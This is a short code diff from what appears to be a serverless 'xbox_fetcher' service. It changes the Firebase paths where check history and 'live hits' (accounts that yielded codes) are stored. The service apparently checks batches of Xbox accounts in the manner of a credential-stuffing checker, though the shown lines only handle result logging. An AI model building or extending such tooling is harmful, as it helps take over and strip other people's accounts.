@@ -482,19 +482,19 @@ serve(async (req) => {
       totalCodes: results.reduce((sum, r) => sum + r.codes.length, 0),
     };
 
-    // Save history to Firebase
+    // Save history to Firebase - using correct paths per Firebase rules
     if (userId) {
-      await firebasePush(`users/${userId}/checkHistory`, {
+      await firebasePush(`checkHistory/${userId}`, {
         service: "xbox_fetcher",
         inputCount: accounts.length,
         stats,
         createdAt: new Date().toISOString()
       });
 
-      // Push live hits for accounts with codes
+      // Push live hits to adminData (admin only path per Firebase rules)
       const hitsWithCodes = results.filter(r => r.status === 'success' && r.codes.length > 0);
       for (const hit of hitsWithCodes.slice(0, 10)) {
-        firebasePush('liveHits', {
+        firebasePush('adminData/liveHits', {
           service: 'xbox_fetcher',
           username: username || 'anonymous',
           hitData: {
